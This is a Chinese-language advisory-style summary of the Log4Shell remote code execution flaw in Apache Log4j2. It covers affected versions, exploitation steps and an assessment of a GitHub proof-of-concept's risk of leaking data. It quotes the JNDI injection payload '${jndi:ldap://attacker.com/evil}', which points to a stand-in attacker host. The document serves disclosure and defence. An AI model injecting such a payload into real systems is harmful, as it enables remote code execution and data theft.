## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)